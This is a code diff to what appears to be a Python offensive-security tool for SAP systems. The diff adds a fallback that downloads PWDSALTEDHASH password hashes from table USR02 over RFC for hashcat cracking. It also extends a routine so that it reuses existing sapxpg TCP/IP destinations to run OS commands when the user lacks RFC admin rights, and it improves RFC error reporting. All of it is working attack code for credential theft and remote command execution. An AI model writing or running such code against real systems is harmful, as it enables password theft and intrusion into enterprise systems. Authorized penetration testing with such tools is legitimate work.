@@ -1935,8 +1935,22 @@ def read_table(node: SAPNode, table_name: str, fields: list = None,
                 rows.append(row_dict)
 
     except Exception as e:
-        logger.error(f"Table read failed for {table_name}@{node.sid}: {e}")
-        print(f"[-] {node.sid}: Could not read {table_name}: {e}")
+        # pyrfc raises ABAPApplicationError / ABAPRuntimeError / etc. with
+        # extra attributes (key, message, msg_class, msg_number, msg_type).
+        # The default str(e) often collapses to "Number:000" with no useful
+        # detail — extract every populated attribute so the operator can
+        # tell NOT_AUTHORIZED from DATA_BUFFER_EXCEEDED at a glance.
+        extras = []
+        for attr in ("key", "message", "msg_class", "msg_number",
+                     "msg_type", "msg_v1", "msg_v2", "msg_v3", "msg_v4"):
+            v = getattr(e, attr, None)
+            if v:
+                extras.append(f"{attr}={v}")
+        detail = f"{type(e).__name__}: {e}"
+        if extras:
+            detail += "  [" + ", ".join(extras) + "]"
+        logger.error(f"Table read failed for {table_name}@{node.sid}: {detail}")
+        print(f"[-] {node.sid}: Could not read {table_name}: {detail}")
 
     return rows
 
@@ -1979,6 +1993,31 @@ def download_password_hashes(node: SAPNode,
             r["hash_quality"] = "half"
         print(f"[+] {node.sid}: Downloaded {len(rows)} password hashes "
               f"(half hashes — BCODE/PASSCODE may be truncated)")
+        return rows
+
+    # --- Method 3: RFC_READ_TABLE without RAW fields (PWDSALTEDHASH only) ---
+    # Wide reads on USR02 sometimes fail because the WA buffer is too narrow
+    # for the binary BCODE+PASSCODE columns, or because S_TABU_NAM auth on
+    # USR02 is restricted but PWDSALTEDHASH is exposed via standard tables
+    # views.  Re-try with just the CHAR/VARCHAR fields — PWDSALTEDHASH is
+    # the modern iSSHA-1 / PBKDF2-SHA1 hash (hashcat mode 10300) and is
+    # full-length VARCHAR, never truncated.
+    print(f"[*] {node.sid}: Retrying without RAW fields "
+          f"(PWDSALTEDHASH only — hashcat 10300)...")
+    safe_fields = ["MANDT", "BNAME", "PWDSALTEDHASH", "CODVN", "USTYP", "UFLAG"]
+    rows = read_table(node, "USR02", fields=safe_fields, creds=creds,
+                      max_rows=9999)
+    if rows:
+        # Mark BCODE/PASSCODE as empty so downstream cracker logic knows
+        # they're not available; keep hash_quality "full" because
+        # PWDSALTEDHASH itself is never truncated.
+        for r in rows:
+            r["BCODE"] = ""
+            r["PASSCODE"] = ""
+            r["hash_quality"] = "issha_only"
+        with_hash = sum(1 for r in rows if r.get("PWDSALTEDHASH"))
+        print(f"[+] {node.sid}: Downloaded {len(rows)} user(s); "
+              f"{with_hash} have PWDSALTEDHASH (mode 10300)")
     else:
         print(f"[-] {node.sid}: No password hashes retrieved")
     return rows
@@ -2352,7 +2391,10 @@ def execute_local_command(node: SAPNode, command: str, params: str,
     """
     result = {"success": False, "output": [], "error": ""}
 
-    # Look for an existing self-referencing TCP/IP destination
+    # Look for an existing self-referencing TCP/IP destination.  This
+    # is critical when the connecting user lacks S_RFC_ADM (FL046 on
+    # DEST_RFC_TCPIP_CREATE): if any sapxpg dest pointing at this host
+    # already exists, we can reuse it instead of failing.
     dest_name = None
     try:
         with _get_connection(node, creds) as conn:
@@ -2366,19 +2408,35 @@ def execute_local_command(node: SAPNode, command: str, params: str,
                     OPTIONS=[{"TEXT": "RFCTYPE = 'T'"}],
                     ROWCOUNT=500,
                 )
+                # Collect candidate host strings the dest might point at:
+                # short hostname, FQDN, IP, "localhost", "127.0.0.1".  We
+                # do a substring match (case-insensitive) on RFCOPTIONS.
+                host_aliases = set()
+                for h in (node.ip, node.hostname,
+                          getattr(node, "fqdn", "") or ""):
+                    if h:
+                        h = h.strip().upper()
+                        host_aliases.add(h)
+                        # Add the short hostname (before the first dot)
+                        if "." in h:
+                            host_aliases.add(h.split(".", 1)[0])
+                host_aliases.update({"LOCALHOST", "127.0.0.1"})
+
                 for row in table_result.get("DATA", []):
                     line = row.get("WA", "") if isinstance(row, dict) else str(row)
                     parts = line.split("|")
                     if len(parts) >= 3:
                         name = parts[0].strip()
                         opts = parts[2].strip().upper()
-                        # Self-referencing: points to localhost or own host
-                        if ("SAPXPG" in opts or "PROGRAM=SAPXPG" in opts):
-                            host_lower = (node.ip or node.hostname or "").lower()
-                            if ("LOCALHOST" in opts or "127.0.0.1" in opts
-                                    or (host_lower and host_lower.upper() in opts)):
-                                dest_name = name
-                                break
+                        # Must run sapxpg via gateway (program=sapxpg)
+                        if "SAPXPG" not in opts:
+                            continue
+                        # Match if any host alias appears in the options
+                        if any(h and h in opts for h in host_aliases):
+                            dest_name = name
+                            print(f"[*] {node.sid}: Reusing existing "
+                                  f"TCP/IP dest {name!r} for SXPG")
+                            break
             except Exception:
                 pass  # RFC_READ_TABLE might not be available
     except Exception:
